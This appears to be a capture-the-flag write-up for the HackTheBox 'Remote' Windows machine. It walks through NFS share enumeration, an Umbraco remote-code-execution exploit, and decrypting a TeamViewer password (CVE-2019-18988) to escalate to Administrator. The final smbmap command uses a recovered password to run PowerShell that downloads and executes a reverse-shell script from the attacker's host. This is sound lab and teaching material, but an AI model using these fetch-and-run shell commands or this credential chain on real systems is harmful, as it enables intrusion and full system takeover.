## TL;DR
Remote was a Windows-based, easy level challenge from mrb3n on HackTheBox that had a cool privilege escalation. The initial Nmap scan showed multiple interesting ports - FTP with anonymous login, web server on port 80, SMB on 445 and a open NFS share. I started by connecting to FTP via the anonymous login, but it showed nothing interesting. Next, a quick enumeration of all available data on the http service led to an Umbraco login. I then connected the open NFS share on port 2049 and begun some real enumeration which allowed an extracted Administrator hash to the Umbraco application. Logging into Umbraco, I was able to exploit the application with a known CVE to obtain a shell as `iss apppool` and capture the User flag. After some system enumeration I discovered TeamViewer ver. 7.0.43148 installed which uses a shared AES key for all customer installations and published under CVE-2019-18988. This allowed a password to be decrypted that just so happened to a reused Administrator user password.

## Web Enumeration

Initially looking at the web page we can see a link to Intranet. 
![](\assets\images\htb\remote\acme-page.png)

Following with clicking the Intranet link, we then see a link to Login which brings us to this Umbraco application. I attempted basic credentials and basic authentication assessment, but had no luck gaining access.

## NFS Enumeration

The Network File System (NFS) is an interesting find in the port scan. Taking a closer look, we see a mountable share `site_backups`.
![](\assets\images\htb\remote\showmount.png)

`mount -t nfs 10.10.10.180:/site_backups nfs/`
![](\assets\images\htb\remote\site_backups.png)

After some enumeration, I located an interesting hash.

Cracking the hash allows us to login to the Umbraco web application with Admin/Administrator.

Umbraco version 7.12.4 was found in the "Help Area" which lines up with an exploit found in searchsploit.

I used some GoogleFu and found another exploit PoC that I liked better here: https://github.com/noraj/Umbraco-RCE

I served a modified Nishang Reverse-Tcp PowerShell script to return a shell:

User.txt was found in C:\Users\Public

Interesting, TeamViewerâ€¦

After a bit of enumeration and research into known Teamviewer vulnerabilities, I located a blog post which describes that the password can be extracted and has the potential to be reused as other users. Looked promising. I located the necessary hashes in the below registry entry.

[Decryption script and writeup.](https://whynotsecurity.com/blog/teamviewer/){:target="_blank"}

I reused my original Nishang shell script and SMBMap to escalate. 

```
smbmap -u administrator -p '!R3m0te!' -H 10.10.10.180 -x "powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/shell.ps1')"
```

Pop!
